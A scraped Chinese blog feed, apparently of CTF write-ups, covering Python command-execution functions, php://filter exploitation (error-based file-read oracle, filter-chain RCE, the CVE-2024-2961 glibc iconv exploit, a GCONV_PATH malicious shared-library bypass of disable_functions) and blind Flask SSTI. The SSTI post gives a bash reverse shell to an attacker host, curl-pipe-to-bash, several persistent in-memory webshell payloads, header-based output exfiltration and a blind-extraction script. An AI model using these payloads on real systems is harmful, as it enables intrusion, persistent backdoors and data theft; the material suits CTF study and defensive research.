可以发现最后调用得还是Popen类的构造函数。只不过这里增加了一个延迟的参数，以及最后返回的是命令退出的状态码。其他一样。 check_call函数看一下源代码： 1234567891011121314151617def check_call(*popenargs, **kwargs): &quot;&quot;&quot;Run command with arguments. Wait for command to complete. If the exit code was zero then return, otherwise raise CalledProcessError. The CalledProcessError object will have the return code in the returncode attribute. The arguments are the same as for the call function. Example: check_call([&quot;ls&quot;, &quot;-l&quot;]) &quot;&quot;&quot; retcode = call(*popenargs, **kwargs) if retcode: cmd = kwargs.get(&quot;args&quot;) if cmd is None: cmd = popenargs[0] raise CalledProcessError(retcode, cmd) return 0 这里本质上是调用了call函数，所以和call函数基本一样，只不过增加了一个对于返回状态码的处理。 check_output函数注释有点长，所以这里只 张贴源代码： 123456789101112131415def check_output(*popenargs, timeout=None, **kwargs): if &#x27;stdout&#x27; in kwargs: raise ValueError(&#x27;stdout argument not allowed, it will be overridden.&#x27;) if &#x27;input&#x27; in kwargs and kwargs[&#x27;input&#x27;] is None: # Explicitly passing input=None was previously equivalent to passing an # empty string. That is maintained here for backwards compatibility. if kwargs.get(&#x27;universal_newlines&#x27;) or kwargs.get(&#x27;text&#x27;): empty = &#x27;&#x27; else: empty = b&#x27;&#x27; kwargs[&#x27;input&#x27;] = empty return run(*popenargs, stdout=PIPE, timeout=timeout, check=True, **kwargs).stdout 可以看到这里本质上是调用了run函数，只不过这里最后返回的是命令执行结果，而不是CompletedProcess对象。所以我们直接调用subprocess.check_output(&#39;whoami&#39;，text=True)就可以以字符串形式返回命令执行结果。没有将text参数设置为True，返回的就是字节串形式。 pty模块pty模块在windows上面不可以使用，因为这个模块依赖于tty和termios模块，这两个模块仅在Unix-like系统上可以使用。 spawn函数看一下源码： 12345678910111213141516171819202122def spawn(argv, master_read=_read, stdin_read=_read): &quot;&quot;&quot;Create a spawned process.&quot;&quot;&quot; if type(argv) == type(&#x27;&#x27;): argv = (argv,) sys.audit(&#x27;pty.spawn&#x27;, argv) pid, master_fd = fork() if pid == CHILD: os.execlp(argv[0], *argv) try: mode = tty.tcgetattr(STDIN_FILENO) tty.setraw(STDIN_FILENO) restore = 1 except tty.error: # This is the same as termios.error restore = 0 try: _copy(master_fd, master_read, stdin_read) except OSError: if restore: tty.tcsetattr(STDIN_FILENO, tty.TCSAFLUSH, mode) os.close(master_fd) return os.waitpid(pid, 0)[1] 这个函数会创建一个子进程，并在伪终端中运行指定的命令。可以看到这个函数就是调用了os.execlp函数。 这个函数既可以接收字符串，也可以接受元组，如果传入的是字符串，他还会将他转换为元组。所以我们直接使用元组即可，像ls -l这种，你直接按照字符串传递进去他是不能正常执行的，应该这样pty.spawn((&#39;ls&#39;,&#39;-l&#39;))。 这个函数的返回值是子进程退出的状态码。 小结以上的总结是针对python3环境的，我们可以看到主要的命令执行模块就是os和subprocess，一般黑名单中也是针对这两个进行过滤。而其中pty模块和nt模块（posix模块）比较少见，容易疏漏。特别是后者，因为在不同操作系统中是不一样的，容易出错。 本来这篇文章还想要介绍一下python中的代码执行函数和高阶函数（可以接受别的函数作为参数，并返回一个函数），但是考虑到篇幅和普遍性，这里就没有继续介绍。而且像高阶函数里面还是要接收其他命令执行函数作为参数才能执行命令的，只有在pickle反序列化中使用find_class()来进行黑名单过滤时，高级函数才能够发挥绕过的作用。 最后，其实在ctf的题目中我们很多时候是通过变形去绕过过滤，所以这里浅尝即止。","tags":["rce"],"categories":["python"]},{"title":"php://filter协议的妙用","path":"/2025/01/28/php-filter协议的妙用/","content":"[TOC] 摘要最近学习到了很多关于php://filter协议的运用，这里记录一下。 借助协议进行文件读取和绕过文件读取在php中使用include函数的时候，如果我们包含的是非php文件的话，我们可以在浏览器界面看到文件内容。所以我们可以借助php://filter协议将要包含的php文件内容进行编码，再将浏览器页面中得到的编码内容进行解码，即可得到php文件内容。 绕过这里介绍一下p神的一篇文章谈一谈php:&#x2F;&#x2F;filter的妙用，16年写的，25年我还在学，哈哈哈。 文章中最重要的一点就是，Base64编码的有效字符只有64种。当我们使用base64_decode进行解码时，如果输入字符串中存在无效字符，这些无效字符会被直接跳过，解码过程只会处理有效字符。解码后的输出内容是由所有有效字符组合解码得到的。（这个技巧在后面很多php://filter的利用中都有运用到） 此外，Base64是以四个字符为一组进行解码的。由于无效字符在解码过程中会被过滤掉，这可能会改变字符的顺序。因此，在构造Base64编码字符串时，需要提前考虑这一点，以确保解码后的结果符合预期。 另外，等号（=）是在进行Base64编码时用于填充的字符，用于确保编码后的字符串长度是4的倍数。填充字符在解码过程中也会被正确处理。 最后，php中的base64_decode函数和过滤器中的base64-decode还是存在着差异的。 可以看到过滤器中的base64-decode并不能够很好地处理等号。要解决这个问题，还需要去掉等号。其中一种解决方案是使用 UTF7 编码，它将等号转换为不会打扰过滤器的其他字符。 Segfault遗留下TEMP文件原理在对php进行临时文件利用时，因为临时文件会被删除增加了我们的的利用困难。如果我们可以让PHP进程在请求结束前出现异常退出执行，那么临时文件就可以免于被删除了。 PHP底层是C语言开发的，不少内存错误都会导致进程异常退出，当然不论是Apache还是PHP-FPM都会存在master进程，在某一个子进程异常退出后会拉起新的进程来处理用户请求，不用担心搞挂服务器。 国内的安全研究者@王一航 曾发现过一个会导致PHP crash的方法： 1include &#x27;php://filter/string.strip_tags/resource=/etc/passwd&#x27;; 可以看到这里又是借助了php://filter协议，不过具体原理我也不知道，网上搜了一下也没有找到，不知道后面的resource是否可以使用其他文件进行利用。 影响范围这个Bug在7.1.20以后被修复。 PHP过滤器链：基于错误的Oracle文件读取原文、详细分析文章 原理这里是一种侧信道攻击，“侧信道攻击”（Side-Channel Attack）和“Oracle”在信息安全领域有着特定的含义和关系。让我们详细解释这两个术语及其关系。 侧信道攻击（Side-Channel Attack） 侧信道攻击是一种通过分析计算机系统的物理实现特性（如电磁泄漏、功耗、时间延迟等）来获取敏感信息的攻击方式。这种攻击不依赖于系统的逻辑缺陷，而是利用系统在执行操作时产生的副作用来推断出秘密数据。 Oracle 在信息安全中，“Oracle”通常指的是一种能够提供反馈的机制或系统，这种反馈可以帮助攻击者逐步推断出敏感信息。Oracle可以是一个错误消息、响应时间、返回的状态码等。 侧信道攻击和Oracle在信息安全中有着密切的关系。侧信道攻击利用系统的物理特性来推断敏感信息，而Oracle提供的反馈可以帮助攻击者逐步推断出这些信息。在某些攻击场景中，侧信道攻击和Oracle可以结合使用，增强攻击效果。理解这两者的关系对于防御和检测此类攻击至关重要。 这里就是基于错误机制的侧信道攻击： 在php中,php.ini的memory_limit参数代表了资源限制,默认值为128MB,如果试图读取大于128MB的文件时就会触发内存错误。 我们可以在此基础上面结合php各种各种过滤器逐步确认文件中各个字符，这里原理并不复杂，但是篇幅较长，可以看一下上面给出的详细分析文章。这篇文章写得也不错。这里不得不佩服原作者的奇思妙想。 影响范围和局限性以下是受影响的 PHP 函数的非详尽列表：（如果要识别其他易受攻击的模式，主要思想是识别使用流或通过读取或修改文件与文件交互的函数。） 在2024春秋杯冬季赛中就出了一个使用了copy函数的题，因为没有进行有效过滤，所以我们可以借助这个技巧来进行文件读取。 只要对文件内容执行了操作，该功能就可能会受到过滤器的影响php://filter。我们都可以去尝试一下。 局限性： 一个是在真实环境中一般会使用file_exists等函数进行判断文件是否真实存在于本地文件系统中，这些函数是不支持过滤器的。 另一个是请求数据很长，请求次数也多，很难隐藏自己，如果对方有什么检测防护的话，容易被检测到。然后因为我们的请求负载普遍比较大，所以如果是get方式的话可能利用不成功。 具体使用脚本地址，通过这个地址将脚本下载到本地。然后执行pip install -r requirements.txt。 假如是一个POST请求，请求参数是file，请求地址是本地，要读取的文件内容是&#x2F;flag。我们一般直接就是 python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file &#39;/flag&#39; --parameter file 这个脚本还支持一些其他参数，具体可以看一下github上面的说明进行了解。 PHP过滤器链：从文件包含到代码执行[原文](Solving “includer’s revenge” from hxp ctf 2021 without controlling any files · GitHub)，[其他人在原文的基础上面进一步研究和优化](PHP 过滤器链：它是什么以及如何使用它) 后文中比较重要的一点就是，我们可以借助php:&#x2F;&#x2F;tmp协议，这是一种临时流，可以使用来储存临时数据。我们可以直接php://filter/过滤器链/resource=php://temp，这样即使我们在目标服务器中找不到可以利用的文件，也能够借助这个方法进行攻击。 原理基本原理就是借助PHP过滤器链生成php代码，通过文件包含漏洞包含生成的php代码，然后就可以进行代码执行。 影响范围和局限性参考前面 具体使用[脚本地址](GitHub - synacktiv&#x2F;php_filter_chain_generator) 直接python3 php_filter_chain_generator.py --chain &#39;&lt;?php phpinfo();?&gt;&#39;即可得到对应的过滤器链，然后包含滤器链就可以执行对应的代码。 从设置字符集到RCE：利用 GLIBC 攻击 PHP 引擎第一篇，第二篇，第三篇 关于这部分的利用原作者一共写了三篇文章，上面这三篇是别人翻译过后的，主要看第一篇文章即可。 原理在linux系统的glibc(linux程序基础库)中存在一个缓冲区溢出漏洞，当php从一个字符集转换到另一个字符集的时候，会调用一个iconv() API，这个API就是使用glibc实现的，而借助php://filter可以实现字符转换。所以我们这里就是通过使用php://filter来触发这个缓冲区溢出漏洞。 然后利用缓冲区溢出漏洞，我们可以覆盖对应的函数指针和对应的参数，使得php在执行内存管理函数的时候自动调用攻击者指定的函数，从而执行对应的命令。 这里不需要借助目标服务器上面的文件，这里是使用data:&#x2F;&#x2F;协议来获取对应的恶意数据。 影响范围和局限影响的php版本：从 PHP 7.0.0 (2015) 到 8.3.7 (2024) 这个漏洞的影响范围比前面得更广：标准输出流出口，从sql注入到远程代码执行，xxe，作为phar的代替品，解析库，类的实例化，改进文件读取的反序列化等。我们还可以借助他来绕过disable_function的限制。 他的有效负载也比较小，而且一般来说三条请求就可以完成一次利用。然后他要求php的iconv()版本满足要求&lt;&#x3D;2.39，还要求一个可以回显的文件读取漏洞，能够控制完整协议。总体要求不算很苛刻。而且就算是无回显的的文件读取漏洞，我们也可以进行利用，这个时候就要借助前面提到的基于错误的侧信道攻击，具体可以看一下第三篇文章。 具体利用安装脚本 12$ git clone --recurse-submodules https://github.com/ambionics/cnext-exploits.git$ pip install -r requirements.txt 然后我们再利用的时候主要是根据对应的环境修改Remote类中的send方法。 12345678910111213class Remote: &quot;&quot;&quot;A helper class to send the payload and download files. The logic of the exploit is always the same, but the exploit needs to know how to download files (/proc/self/maps and libc) and how to send the payload. The code here serves as an example that attacks a page that looks like: ```php &lt;?php $data = file_get_contents($_POST[&#x27;file&#x27;]); echo &quot;File contents: $data&quot;; Tweak it to fit your target, and start the exploit. &quot;&quot;&quot; def __init__(self, url: str) -&gt; None: self.url = url self.session = Session() def send(self, path: str) -&gt; Response: &quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response. &quot;&quot;&quot; return self.session.post(self.url, data=&#123;&quot;file&quot;: path&#125;) def download(self, path: str) -&gt; bytes: &quot;&quot;&quot;Returns the contents of a remote file. &quot;&quot;&quot; path = f&quot;php://filter/convert.base64-encode/resource=&#123;path&#125;&quot; response = self.send(path) data = response.re.search(b&quot;File contents: (.*)&quot;, flags=re.S).group(1) return base64.decode(data) 可以看到这里send方法就是使用来发送文件读取请求的，因为环境不一样，请求的方法和参数也可能存在不一样，所以我们需要对应的进行修改。 修改之后，直接运行脚本python3 cnext-exploit.py &#39;xxxx&#39; &#39;yyyyy&#39;即可。这里第一个参数是url，第二个参数是system函数要执行的命令（这里不支持–url的形式，这里只是一个位置参数）。还有这个脚本是没有回显的，我们想要查看执行的结果需要将命令执行结果写入文件，再通过浏览器进行查看。 还存在着一些其他的参数可以使用，可以自己看一下脚本分析一下。 该漏洞利用我们可以借助vulhub搭建对应环境测试一下。https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md 借助iconv()绕过disable_functions因为这里是通过对内存进行覆盖来执行命令，所以我们也可以借助命令来绕过disable_function。我们先上传一个可以回显的文件读取文件，然后再借助上面的攻击脚本即可执行命令。 但是很多时候针对iconv()，我们是通过上传恶意的动态链接库文件来执行命令进而绕过disable_function的。蚁剑中的插件也是使用的这个方法。 原理本质就是在调用iconv函数的时候操作系统会加载一个动态链接库文件，调用这个文件中的函数。然后因为文件路径和文件内容我们可控，所以我们可以在文件中写入恶意命令，因为这个时候本身调用的是c语言中的函数，所以我们就绕过了disable_function。 具体原理我这里不再阐述，可以看一下这篇文章。 实战利用环境搭建 123git clone https://github.com/AntSwordProject/AntSword-Labs.gitcd AntSword-Labs/bypass_disable_functions/9docker-compose up -d 使用蚁剑进行连接 12http:127.0.0.1:18080连接密码：ant 第一种方法： 上传iconv.php文件到网站目录下面： 123&lt;?php $data = file_get_contents($_POST[&#x27;file&#x27;]);echo &quot;File contents: $data&quot;; 然后借助上面的攻击脚本就能够执行命令。 第二种方法： 先上传一个gconv-modules文件到&#x2F;tmp目录下面： 12module HACK// INTERNAL ../../../../../../../../tmp/hack 2module INTERNAL HACK// ../../../../../../../../tmp/hack 2 再写一个hack.c文件： 123456789#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void gconv() &#123;&#125;void gconv_init() &#123; system(&quot;要执行的命令&quot;);&#125; 执行命令：gcc hack.c -o hack.so -shared -fPIC 得到hack.so文件，再上传hack.so文件到&#x2F;tmp目录下面。 最后上传一个shell.php文件到网站目录下面： 1234&lt;?php putenv(&quot;GCONV_PATH=/tmp/&quot;); iconv(&quot;hack&quot;, &quot;UTF-8&quot;, &quot;whatever&quot;);?&gt; 这里需要注意的是要保持文件路径一致和文件名一致，如&#x2F;tmp和hack。如果改的话就都要改。 还有这个方法同样没有回显，所以需要我们将执行的命令结果写入文件来进行查看。 本来还想要试一下蚁剑的插件，因为windows上面那个插件使用不了，想要在kali上面安装一个（kali上面居然没有自动安装），结果安装失败了，搞了半天，下次再看看吧。 总体来看，还是更推荐第一种方法，因为第二种方法每次执行一个命令还需要再重新写文件，重新编译，重新上传，比较麻烦，也容易出错。 小结很是佩服这些研究人员的奇思妙想，最重要是他们能够通过查找资料和测试来实现落实。关于php://filter协议肯定还存在着其他利用，后面有机会再 补充进来。 参考文章 references: 谈一谈php:&#x2F;&#x2F;filter的妙用 Docker PHP裸文件本地包含综述 侧信道读取文件原文 侧信道读取文件原理分析文章1 侧信道读取文件原理分析文章2 侧信道读取文件脚本地址 [从文件包含到代码执行原文](Solving “includer’s revenge” from hxp ctf 2021 without controlling any files · GitHub) [从文件包含到代码执行进一步分析和优化](PHP 过滤器链：它是什么以及如何使用它) [从文件包含到代码执行脚本地址](GitHub - synacktiv&#x2F;php_filter_chain_generator) 利用GLIBC攻击PHP引擎第一篇，利用GLIBC攻击PHP引擎第二篇，利用GLIBC攻击PHP引擎第三篇 利用GLIBC攻击PHP引擎脚本地址 利用GLIBC攻击PHP引擎docker环境搭建 蚁剑iconv函数绕过disable_function原理 …","tags":["技巧"],"categories":["php","php://fliter协议"]},{"title":"flask中的ssti注入-无回显","path":"/2024/12/30/flask中的ssti注入-无回显/","content":"[TOC] 摘要这篇文章主要是讲解针对ssti注入无回显的情况，我们如何获取flag（本篇文章的测试环境是python3.9.13，flask3.0.3和pyton 3.6.8，flask2.0.3）。 能出网反弹shell我这边建议是将反弹命令写在本地服务器上面，然后再进行请求执行，这样不容易出现错误。 在本地服务器上面新键一个文件（假如是rebound.txt）： 1bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1 本地监听端口： 1nc -lvvp xxxx 再借助ssti注入执行命令： 1curl xx.xx.xx.xx/rebound.txt | bash 这样还有一个好处就是，我们可以通过查看本地日志来检查是否接收到对方的请求，因为有的时候反弹不成功不一定是不出网。 dnslog外带没什么好说的，没有服务器的话可以考虑一下这个方法。 不能出网写文件我们可以将命令输出的结果写在当前运行的脚本文件当中，因为文件已经加载到内存当中，所以就算我们的输出结果将文件进行覆盖，我们还是可以继续执行命令。当然如果是在实战环境中，我们最好还是在一个能够访问的目录下面创建一个文件，写在里面。 这个时候就需要获取当前运行的文件名，当然我们也可以使用一些常见的文件名进行测试一下，如app.py等。 sys模块获取文件名1&#123;% set filename = x.__init__.__globals__.sys.argv[0] %&#125; 还记得我们前一篇文章绕过中讲过得吗？这个时候的x因为没有定义，所以相当于是runtime.py中的Undefined类，而runtime.py文件中导入了sys模块，我们借助sys模块就能够获取文件名。 os模块获取文件名12&#123;% set filepath = lipsum.__globals__.__builtins__.__import__(&#x27;__main__&#x27;).__file__ %&#125; &#123;% set filename = lipsum.__globals__.os.path.basename(filepath) %&#125; 这里是先获取了绝对路径，再通过绝对路径获取的文件名。这里获取绝对路径是通过当前模块的__file__属性，所以这个payload成功的条件就是要求当前模块的名字是__main__。而当一个文件被直接运行的时候，他当前的模块名就是__main__；如果是作为模块被导入到另一文件中，这个时候的模块名就是他的文件名，如app.py，就是app。 通过这两种方法，我们就可以得到运行文件的文件名，我们可以将输出结果写在运行文件中，也可以通过相对路径或者绝对路径写到其他文件当中。 打内存马受版本的影响，flask的内存马有旧版本和新版本之分，但是具体从哪个版本划分的，我也不知道，网上搜索了一下没有找到。然后这里我旧版本内存马测试使用的是2.0.3版本，新版本内存马测试使用的是2.0.3版本。 旧版内存马1&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 这里具体的payload不会讲解，可以看一下参考文章。这里有一点要说明的是，这里eval第二个参数是在设置全局变量，要不然app和_request_ctx_stack在eval函数中访问不了。 旧版内存马在新版中的使用旧版内存马在新版本中直接使用会抛出AssertionError，错误中写得很清楚The setup method &#39;add_url_rule&#39; can no longer be called on the application. 为什么抛出AssertionError。 参考文章中写得很清楚了，我再补充一点就是在新版本中url_for.__globals__中已经没有_request_ctx_stack但是多了一个request_ctx，这是一个LocalProxy对象，所以后面的pyaload都是使用他去获取request对象了。 在参考文章中也说了，我们也可以在新版本中使用旧版本的内存马，因为add_url_rule方法本质上就是调用了url_map.add方法和view_functions.update方法。文章中虽然给出了对应的两个payload，但是想要具体在ssti注入中进行使用，还需要经过一些处理。 首先，如果我们直接这样使用&#123;% set app = url_for.__globals__['current_app'] %&#125;&#123;&#123;payload&#125;&#125;，第一个paylaod是正常的，但是第二个payload出现jinja2.exceptions.TemplateSyntaxError: expected token &#39;,&#39;, got &#39;:&#39;。 所以我们这里需要借助eval函数，如果借助eval函数，这个时候就需要在eval内部中定义app变量，如果我们是定义在&#123;%%&#125;中是没有作用的，具体原因去参考eval函数使用的官方手册。 payload 1234&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.url_map.add(app.url_rule_class(&#x27;/flask-shell&#x27;, methods=[&#x27;GET&#x27;],endpoint=&#x27;shell&#x27;))&quot;,&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.view_functions.update(&#123;&#x27;shell&#x27;: lambda:__import__(&#x27;os&#x27;).popen(app.request_context.__globals__[&#x27;request_ctx&#x27;].request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&#125;)&quot;,&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 分两次注入即可，看一下最后的效果。 新版内存马虽然说是新版内存马，但是在旧版本中也可以使用，两者的区别就是获取request对象的方法不一样，一个是app.request_context.__globals__[&#39;_request_ctx_stack&#39;].top.request，一个是app.request_context.__globals__[&#39;request_ctx&#39;].request。具体原因前面已经讲过。这里payload也是不具体解释，看上面的两篇参考文章，不过想要在ssti中使用，还是需要借助eval函数。 before_request旧版中 1&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(app.request_context.__globals__[&#x27;_request_ctx_stack&#x27;].top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 新版中 1&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(app.request_context.__globals__[&#x27;request_ctx&#x27;].request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 这种打内存马的方式并不推荐，因为他是在我们请求之前进行处理，所以无论我们内存马是否注入成功，都会影响我们正常的业务逻辑。除此之外，一但我们注入失败，我们再想要注入就只能够重新启动靶场。 使用url_for统一获取request对象因为我看到的参考文章中绝大多数都是通过上面的两种方法来获取的request对象，所以我这里也讲解了一下，但是其实我们可以直接使用url_for来获取request对象，而且这种方法在新旧版本中都可以使用，这样就统一了payload。 1&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.before_request_funcs.setdefault(None, []).append(lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 包括前面提到的旧版内存马我们也可以使用这种方法去获取request对象。 1&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 1234&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.url_map.add(app.url_rule_class(&#x27;/flask-shell&#x27;, methods=[&#x27;GET&#x27;],endpoint=&#x27;shell&#x27;))&quot;,&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.view_functions.update(&#123;&#x27;shell&#x27;: lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&#125;)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 所以后面我们都使用这种方法去获取reqeust对象 after_request1&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\\&quot;global CmdResp;CmdResp=__import__(\\&#x27;flask\\&#x27;).make_response(__import__(\\&#x27;os\\&#x27;).popen(request.args.get(\\&#x27;cmd\\&#x27;)).read())\\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 这种方法我们可以通过控制cmd参数来决定是否执行命令，从而也可以执行正常的业务逻辑。 errorhandler12&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;exec(\\&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read()\\&quot;)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125; 使用时访问一个不存在的页面传参即可。所以这个也不会影响正常的业务。 响应包回显我们先来看一个直接使用python执行程序的200响应包。 可以看到这里的Server回显是和python有关系的，这说明我们可以尝试将这里的Server转换我们命令执行的结果，这样我们就能够得到回显。除了这个，最上面的HTTP/1.1 200 OK也是可以进行替换的。本质上就是将某个对象的属性进行更改。 我们再来看一下404响应包 这里面最下面的返回的信息也是可以替换为我们命令执行的结果。下面具体payload不再解释，可以看参考文章，或者自己进行调试。然后参考文章中使用lipsum.__spec__.__init__.__globals__.sys来获取sys模块，有点繁琐，所以我们这里直接使用url_for.__globals__.sys。还有作者这里还使用lipsum.__globals__.__builtins__.__import__(&#39;os&#39;)来获取os模块，但是其实lipsum.__globals__中本身就已经有os模块，不过我们这里统一使用url_for.__globals__.os也是一样的。 http协议回显1&#123;&#123;lipsum.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;protocol_version&quot;,url_for.__globals__.os.popen(&#x27;echo%20haha&#x27;).read())&#125;&#125; Server头回显1&#123;&#123;lipsum.__globals__.__builtins__.setattr(url_for.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler,&quot;server_version&quot;,url_for.__globals__.os.popen(&#x27;echo%20haha&#x27;).read())&#125;&#125; 就是将protocol_version改为了server_version，我们还可以改成sys_version。 404回显1&#123;&#123;url_for.__globals__.__builtins__[&#x27;setattr&#x27;](url_for.__globals__.sys.modules.werkzeug.exceptions.NotFound,&#x27;description&#x27;,url_for.__globals__.os.popen(&#x27;echo%20hello&#x27;).read())&#125;&#125; 其中前面两种使用起来简单一点，因为不需要来回切换页面，但是前面两种有的时候是不行的，这个时候就考虑使用404。具体可以看一下202412月长城杯中web的safe_proxy，我当时就是试了前面两种方法，结果不行，后面试了404才成功，具体原因可以搜一下题目获取源码分析一下。 按照这个思路，应该还有其他一些页面可以借助来进行回显，如500,302等。但是期末周时间有限，先到这里了。 盲注盲注的思想基本都一致，可以参考sql注入。 布尔盲注我们先来看一下场景： return &#39;ok&#39; if result is not None else &#39;error&#39;。 脚本： 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python3# coding=utf-8import requests# 注意: 这里只适用于 &gt; 的情况flag = &quot;&quot;start = 1 # 第几个字符while True: low = 32 high = 128 mid = (low + high) // 2 # 整数除法 while low &lt; high: url = &quot;&quot; payload = f&quot;&#123;&#123;% set a=url_for.__globals__.os.popen(&#x27;whoami&#x27;).read(&#123;start&#125;) %&#125;&#125;&#123;&#123;% if a&gt;&#x27;&#123;flag + chr(mid)&#125;&#x27;%&#125;&#125;ok&#123;&#123;% else %&#125;&#125;&#123;&#123;&#123;&#123;x.y&#125;&#125;&#125;&#125;&#123;&#123;% endif %&#125;&#125;&quot; data = &#123; &quot;code&quot;: payload &#125; # 页面返回正常的特征值 identify_str = &quot;ok&quot; # 请求 response = requests.post(url=url, data=data) # print(payload) if identify_str in response.text: # 页面返回正常 low = mid + 1 else: # 页面返回异常 high = mid mid = (low + high) // 2 if mid &lt;= 32 or mid &gt;= 128: break if chr(mid) == &#x27; &#x27;: break flag += chr(mid) print(flag) start += 1 这个脚本关键就是在这里x.y，因为x没有定义，所以&#123;&#123;x.y&#125;&#125;就会出现500错误，这个时候就可以和正常的返回值区分开来。 这个脚本有一个问题就是，如果我们使用16进制编码，8进制编码和unicode编码等这些进行绕过的时候，在发送数据包的时候他会自动转换为正常的字符串，这个时候就会被黑名单检测到。所以我们需要对这些编码再进行url编码，这样就不会被自动转换了。 但是这个时候又出现了一个问题，就是使用python中的request发送请求的时候，他会自动进行url编码，这样就相当于url编码了两次，我们的payload就无法被正常解析。这个时候我们就要想方法不要让他进行url编码。 给出脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041#!/usr/bin/env python3# coding=utf-8import requests# 注意: 这里只适用于 &gt; 的情况flag = &quot;&quot;start = 1 # 第几个字符while True: low = 32 high = 128 mid = (low + high) // 2 # 整数除法 while low &lt; high: url = &quot;&quot; payload = f&quot;code=&#123;&#123;% set a=url_for.__globals__.os.popen(&#x27;%5cu0077%5cu0068%5cu006f%5cu0061%5cu006d%5cu0069&#x27;).read(&#123;start&#125;) %&#125;&#125;&#123;&#123;% if a&gt;&#x27;&#123;flag + chr(mid)&#125;&#x27;%&#125;&#125;ok&#123;&#123;% else %&#125;&#125;&#123;&#123;&#123;&#123;x.y&#125;&#125;&#125;&#125;&#123;&#123;% endif %&#125;&#125;&quot; # 页面返回正常的特征值 identify_str = &quot;ok&quot; # 请求 headers = &#123; &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Host&quot;: &quot;47.93.240.249:5000&quot;, &quot;User-Agent&quot;: &quot;python-requests/2.32.3&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Content-Length&quot;: &quot;106&quot; &#125; response = requests.post(url=url, data=payload, headers=headers) # print(payload) if identify_str in response.text: # 页面返回正常 low = mid + 1 else: # 页面返回异常 high = mid mid = (low + high) // 2 if mid &lt;= 32 or mid &gt;= 128: break if chr(mid) == &#x27; &#x27;: break flag += chr(mid) print(flag) start += 1 和前一个脚本相比就是，前一个脚本是data = &#123;&quot;code&quot;: payload&#125;，这里是直接payload = 